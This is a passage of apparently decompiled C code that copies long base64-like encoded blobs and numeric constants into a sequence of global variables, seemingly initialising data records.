8BCnUtHVMH256sT7yECtNg+mHAUOpJNcAjPp8aaovH05+tTyIwivny2MTZqcphUUR47cWNOolRu28hNFVGIFOPuTCID63N0dF1lhwiJoqZFEoqukVpvakjV6H4YbSleT5jbe+lSr01WHtjYeFGf98ozeBGmUaL7gk3yh9LY7Ym81y/vvZQNOJapX9BJ3+pU2nMWDQn/Bc3lFVCoHll2jLqzBWzoEIWmPdY2HJ3+ZDyBpM3IEqQUNmwez031iyoJ4YBe/UlxJSCkgLbV+Sa/Gxx0s6zI+3AUorEW/or2wFxdlURhlRmrKCHk3ipN+RFqlEbzi1HDgYAOEQwkBNIIgbaM0OQsHILhuYoQRBOis++9uVWPl5jNWLToSfgKmZT6xe0ewvsd6LUXcNIuH8ZBaSx23Db3gkd/tqi05Zg06LUb9fMYroy0LA6DutGXrbZWfs0ytPiv0lkNBtGTx3P0JWkKomt1sBLDxvuZqn19ekkd5Op9cS1ljHfXgt7QAQFvW25qCpBHkNPdz8fn1XEolubfUCGD2dq01onMaCiHJI6JUN4Rqx0xFKn8Gr+oY69mXfBlpNO2GZ6gJVmNmng8wE4H94mYqqpXhrlp8HmBJcxzJW+VytsVwwtjkV8dcFfUEy2LXibUVsZ0tfkm2XnaCOCZUHFyaKFqSTjE55pwE7+DgzsTdkzYoto+oHVumDSUFsKjuxxKOAXEWxNvSIUdEB2Za75OR8ymYK9aUq52ZNG9E13awruW7eUn6L1krq54Y4wHVB5QCkD18ZrT9S+SeOraduhHd1kgU6v98NS2PzySgSSaOT6vh8ZBAROFoy6+yEP+5qhRcCAvVhAyylGn1ORV39sHJldQYFaUMCkbTwtFn8CZbBQcag+wUtiNiVMmaoIh4yZx5oYYkfd9YnV4TzEQeB5HkvRHfHqU/CZsRTJKVl3qSOAMrhQZrKqzowfLI3LSOCf+C3bloIQu8u4SWreQ55C+o0t+/RrfMdZwKei24tlGXqWY7sch/2E+ot7kwi5fZLwO6pu39WvnI/wVWFfka8BCcMgidP7O7ql2LotXHgs5ySAdSOckbtJmo4h08XFV0p715lZEBHlbyYBewCb9agZPVPzDWKVT94uR68Kw3RFtCuXs8gGpgfGo/bT/yuScolH+ogjOOxAuoh2o+bFGQ0MZ3NVnGSlZn4wrHF6rkLqTXWH1oyt7ZFsCWV+EskFhRWbyM96a0THCcdSkLISfZXHYKkzKcgELIMM8qVBqXl8Ni2yxemE2n8zQuXsUir6z0gAKL+6dRkMcdAUt9Q+g+ygmMHxSl7Nxl/KJfGTBd8uBCY+8VB58e21lL8bLe0Go9kfDJCJ/FkZJGkVgK5F4eZX/zERhD2CyDNBrgirjwCeKgFcGDttFqudl5tXmPvJh7RQJsZ/wFX9y28zvzY/rBKNi3Mrxgsjf2p7r0pCJMOaEL+mOdlPlbLWrpY5HNwTgEtw0rV3ARznLMA9AaxJKwF3nlRi3is3k6EaWnnfQmkVI6/vJk8fZNs005MECGxLZohesLAh4eGp9F+BCg3PB4Xkmhsd5Dfj9mVz+lRw3gjEC88kX9tpxDXr8SUAw9hnBmjUrshletxdp9HC0nUiXx6rzZ54vsswauif+d89YgO1hEtsbfOP9COW58OYiqkunK012HsHOjoPyd4T2t9wKhMNDB/YX0e/ks/T4YBOhjoy/r3fDSBSIfgR5+kT6KD24XiwvrlrUP5FJN58Y2kWYbINeNDIydOipJr8Vu5fh8byKy34IbvWxzF0k4bAyWuIjebXi", 365);
    g345 = 0x20000000;
    g346 = 0x3f09f676;
    *(int16_t *)&g347 = 0;
    g348 = g6;
    g349 = 1233;
    memcpy((char *)&g350, "8Gr+oY69mXfBlpNO2GZ6gJVmNmng8wE4H94mYqqpXhrlp8HmBJcxzJW+VytsVwwtjkV8dcFfUEy2LXibUVsZ0tfkm2XnaCOCZUHFyaKFqSTjE55pwE7+DgzsTdkzYoto+oHVumDSUFsKjuxxKOAXEWxNvSIUdEB2Za75OR8ymYK9aUq52ZNG9E13awruW7eUn6L1krq54Y4wHVB5QCkD18ZrT9S+SeOraduhHd1kgU6v98NS2PzySgSSaOT6vh8ZBAROFoy6+yEP+5qhRcCAvVhAyylGn1ORV39sHJldQYFaUMCkbTwtFn8CZbBQcag+wUtiNiVMmaoIh4yZx5oYYkfd9YnV4TzEQeB5HkvRHfHqU/CZsRTJKVl3qSOAMrhQZrKqzowfLI3LSOCf+C3bloIQu8u4SWreQ55C+o0t+/RrfMdZwKei24tlGXqWY7sch/2E+ot7kwi5fZLwO6pu39WvnI/wVWFfka8BCcMgidP7O7ql2LotXHgs5ySAdSOckbtJmo4h08XFV0p715lZEBHlbyYBewCb9agZPVPzDWKVT94uR68Kw3RFtCuXs8gGpgfGo/bT/yuScolH+ogjOOxAuoh2o+bFGQ0MZ3NVnGSlZn4wrHF6rkLqTXWH1oyt7ZFsCWV+EskFhRWbyM96a0THCcdSkLISfZXHYKkzKcgELIMM8qVBqXl8Ni2yxemE2n8zQuXsUir6z0gAKL+6dRkMcdAUt9Q+g+ygmMHxSl7Nxl/KJfGTBd8uBCY+8VB58e21lL8bLe0Go9kfDJCJ/FkZJGkVgK5F4eZX/zERhD2CyDNBrgirjwCeKgFcGDttFqudl5tXmPvJh7RQJsZ/wFX9y28zvzY/rBKNi3Mrxgsjf2p7r0pCJMOaEL+mOdlPlbLWrpY5HNwTgEtw0rV3ARznLMA9AaxJKwF3nlRi3is3k6EaWnnfQmkVI6/vJk8fZNs005MECGxLZohesLAh4eGp9F+BCg3PB4Xkmhsd5Dfj9mVz+lRw3gjEC88kX9tpxDXr8SUAw9hnBmjUrshletxdp9HC0nUiXx6rzZ54vsswauif+d89YgO1hEtsbfOP9COW58OYiqkunK012HsHOjoPyd4T2t9wKhMNDB/YX0e/ks/T4YBOhjoy/r3fDSBSIfgR5+kT6KD24XiwvrlrUP5FJN58Y2kWYbINeNDIydOipJr8Vu5fh8byKy34IbvWxzF0k4bAyWuIjebXi", 308);
    *(char *)&g350 = 56;
    g351 = -0x20000000;
    g352 = 0x3f15170a;
    *(int16_t *)&g353 = 0;
    g354 = g6;
    g355 = 1502;
    memcpy((char *)&g356, (char *)&g40, 375);
    *(int16_t *)&g356 = *(int16_t *)&g40;
    g357 = 0x50000000;
    g358 = 0x3f105d45;
    *(int16_t *)&g359 = 0;
    g360 = g6;
    g361 = v3;
    memcpy((char *)&g362, "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", 365);
    g363 = 0x18000000;
    g364 = 0x3f31601c;
    *(int16_t *)&g365 = 0;
    g366 = g6;
    g367 = 1233;
    memcpy((char *)&g368, "7Sq0GEif6VwYamTKAV2FIj62LcibRoGnLMb/CzXbbGe7wQJvtv1rxJhvFS4ezJr33/dccs9lhUeWuiFwujna6dmmxoLhY1pnsClCbA2Y78t6xPpBEIG58xAwGERiJcvy4LVXIz78LEa4CZSVTJ2CwGRvHeSt5wvJsmd2AtT2EzKV/sFKK3F5LYMlNatBdm+CaFA5w0AVJI+Vd2Sw/hzkowh7ofqSxRJANXC3ljsiLLX9PgJovhmIX3magDl96lQbtyDcQaaFHGj/rCsKbeHNqDmdvwYThu+N5Aceqm/NAko4PN4jCb8ljdyHedc+a0Ll5f2ktVN57n+W4ABgAz6HSHg6LOEQt+cRLksBYG08tx9x5FBZdwcWAbKInPPuFoYy33AS5IEB+S62I7Pvq933d+O6tIjJAFWiRIu6j38+gjk7S40O/lRcLU4AJh9suzHH3Jhv7SWxRunV8WKa+w2zv/kzn1tALCX3S9QXWESW4BL2+uk4AB3C/R21KuG5Pr1D/BpOjgSlIr2fDt7Ull0CBB8F8MAgbxEx7892eVBXvz2Aa3B3Now17ezS8IGgyJFgpUNnTsvFYCJpmu8ZiCou+4Y9PFE2Aq/JP73dKOewZib9zIPfPrjyONiobPbo1bCl/m+TSdhqUh5FYmcxDK9ISe0ElEdgkTOm6Nix8wvPsODOynqdIeS4JkPGwOBxnp678RIFb24/AnQdHhRFPOl2CEJKX+CH1pmztWjhR+6blLrvP/+UKFwewIrG58534tZfUzl2UQtv7ezYAPP3C0vvWzfSfUJpDPOpgbVTvJyI+3r/g0FhmSJaSIWIKiOIh245BAVrrJ/ZkjMSbu57KCiySaIJdi2+ltpquy0TFCfM2kcGju1SPq3SFDLSN/E3I8TO7WWeIA3Qntm5VqlK2bs8zoaIVgcF4tWs3xpdavYegL1N/96CZdqaJMKfY76tApl6VdxB/vvqc+X2l2uqGAPDpefagUipGU/dpIuJBTMluL5OnrYTs3PqAJpoq0154OyHtwvgrab7nhJFZXa/vl4CnWEXhQ3UUvlQHBhVoqSYRqeE/EKiJjaJtKhL3V+a+PQVniOOylW77dGba3F3h/aQJgZ/7+33utKuh+9eSAJdPZlhNQmncsmObaUJRYxGkYz+ShjASOOqH2ev3aT0Zpx4SvbZBcYF/A1yoX8W7lD0CHMIhogHgmauAu1g1DHViPB+qZgx108f1PxpwfKkG", 308);
    *(char *)&g368 = 55;
    g369 = -0x40000000;
    g370 = 0x3f07bfed;
    *(int16_t *)&g371 = 0;
    g372 = g6;
    g373 = 1502;
    memcpy((char *)&g374, (char *)&g41, 375);
    *(int16_t *)&g374 = *(int16_t *)&g41;
    g375 = -0x21a00000;
    g376 = 0x3f8e66cb;
    *(int16_t *)&g377 = 0;
    g378 = g6;
    g379 = v3;
    memcpy((char *)&g380, "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", 365);
    g381 = -0x78000000;
    g382 = 0x3f45f817;
    *(int16_t *)&g383 = 0;
    g384 = g6;
    g385 = 1233;
    memcpy((char *)&g386, "pG948eDxVi0c9rz6Pd9pWkCcyRpQUog0FbjWSyjpJWGlcrbeozcHnn2QmmQfUqWU+Go8pSN175xlKqIP1cT5EzU5oIR7Sj5jVO7miqlawsIW33WxlqhkE2SRRUtyoPRajun58cyRimEvyxEEpLD4yfRSNbFEJcWsFp3p8bfbgIc8iQDibQy2u9QmB3g08sJ5IIvrDPUg9UDxblaYNQjYb2zirFVOVo2DMg8PSfqh/HQ0ciaS6HXqNDK/pDKHGtCZYDQcO/+g5Y5lZHYepv4hIpB+ELnZ4Xxu5Vp2XoVFS1eiDn2yo96UESRijzinXihwqNAM7Lt86kBes2O2MVZ8JVAWb3pgk4HmSdS4GTMZsiaUSKVsWoZgcFKfa9wh80hx0nQ4gRa68JKMzXGARH9tyVjcBZo5vl3dKCFGVDnWGWASQhy6Csm4cesk8RhDCqx+O1iQArLcEUB3FrlR8tTjKKqT3vsiL6E282UtpLUFTIHvEiJhD6vgUyKNcKo9kNXbVhvBlw77cA8c3Kz8J1y8S691n6CQZn5FObY8LvAFP7wJQNGxh4wIin9TF9aRFQdNqvXCdo87VL4z563yfHa/UpZgwhvV/qcMp/jP5jHJ8ZFFy56mnDY30U3xcb5eLywoswW6csMqjKWNpHZFYzPG4pU59RbRoDCKpPgPSW0ITE1UvYkIKtRpgMG0MzeAQTsZGpeN9h+3wHxhjhsxiDRYahqK7fOQe+zlYiuatYPp8MzQaQ5NvDR+0fF2Dqln+cli5NmRH6lPN6nxC2VQL1MlmpfrlAY7dvJ7HL4CybAjratuWKCpg8MSYYgAc5hYy/9PnlEIgeNPT92QbJnhQN7hDoyFMYpJrnjshCFarUnyK4duVjUSXcEyXv9hXhpe2ONRzkF4x+C/1XPtgqp2MrXWy2xsQ18e1MWoFTmnDOpqP+clh0I24+Gks5khU2eCJPsSzJO6NlrUDWLrm+cD+QSWjzWnU4W/pUFxMcNalo4hsmgKIMRre4n6lFwhtcdCFR+AYeA0Yewgt3c0YNTPy/CaB8JjnKBFug0KMkVMRQ9ffdNsROJeIAvMT6baMWHrxYZzgcjdDREH4LiaB3FoVonoJ/XJmvXUDSwsJYaThffhLlXS7poH/UmRhX8rJ1QoSMz7vXhxKl6TOMuX+3Q3bKY4mQGAT5ptJdS4cPnRuhyaUgGdABBu7T39OP/OBRFgdyvlKQO2rNrIQQIz1kfRY", 308);
    *(char *)&g386 = 112;
    g387 = -0x40000000;
    g388 = 0x3f06f1a2;
    *(int16_t *)&g389 = 0;
    g390 = g6;
    g391 = 1502;
    memcpy((char *)&g392, (char *)&g42, 375);
    *(int16_t *)&g392 = *(int16_t *)&g42;
    g393 = 0x60000000;
    g394 = 0x3f0fcd83;
    *(int16_t *)&g395 = 0;
    g396 = g6;
    g397 = v3;
    memcpy((char *)&g398, "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", 365);
    g399 = 0x22000000;
    g400 = 0x3f424cab;
    *(int16_t *)&g401 = 0;
    g402 = g6;
    g403 = 1233;
    memcpy((char *)&g404, "Aerr1rcEnOrGccXjpe5VlYBzdZv7janZ2d7k8DKIUfKrfL0Q02s4KYBrClScqHuKD+nZiAGlUF3LdVdAbKlbY0B0Of/7J6XTHXiX117oSxucY8LkL6kjuxNdUwYJwuBESmeb3FdNRtgbwvT9SHDJjqwnsYiSBgkXLG5yOwMoa9xMbTaxq6jScOR81odD7ClAylSXnuUCHbUdpyTb0cZR4Z/MnoJeyB8FmnDVicluS9fCXLtEX4BPaGEeUu8PxjEfvztqGOTvRbZqgSHUZB94hRCRtrH6HtUDPxM/iwwByADEGgeM84KLSpHzDSs5wZe2aBWnZGndNgClZmvhUvJSJ1F+MfK40MCoM1fP2TYL6iAA/NjQqFHG7TDnejw5sUnXDDfLCpD/HcKPvroPsC9qrigimwlEn4KLtEI3Ic0xpDeDiHwnOpJKWtxnz46IKnjadOn8Rwnwx9sW3wumyAzORT9pSht+NJEfVqSofR2msfVBk/nwjbPpXc9cw3Cj20My4iHG9G4ARN1GqwO2xH8vQDaUsn7Qw5fT2aY5JJdMz2vPXMYKI8QNhVbo+xa6vj7fod/QHKmKUhGD9j1MVh90zMBJK46TU8otxH+QyRypl1gLUR84ekXdh1O/zJilI9DBTj67LIG1NtO6bEti0APLCcWaQ06vgvTtMOzIHvpPgk3MHgrC9VgTwOb5sYhsVBj3oBC1L2KQXHAza+9UBML8RXx3AbWmbNv7wtGvBJ/2NlQXGEXm5G3Ecjp/i/COEUJzljxZ5ueMaaqdDj0/WXK9d/UQiHT742mCLfi/SkPkd+STSCcsLdwZ7vHDF4txL5Pa2W3ArpVLhQRoU/mNqVIyObXCm6O2atx6H7k9hHfYxX2btGBO4e9Wyz+KrieA6wXQSAIERL1SDoEq0ScCwzoUrrlcYVi+9wdjVuPzY6wN28tmhiYO7Q+UFFfP/bcJ4FTPy5qnpEnX6v+n88x+C1TSRKCzHZ9osGZF3WtNaDyBIirDNBcOtpV0TcMLaoZiSGg7YW1BrYdfwMKBsYuKJRWwZkhWE+eFof/Ewh9W8LWe7JEzAvvJYtQ7NvSw+c9ESHesxkplngceIndRgnvCLX7wXm3hfa4vmNWdsNkYmogq2NlyqNwIoati8rcwQ6B69YaXTZBG1wXqRaLa7lUDf0Irv1081m+qjzOr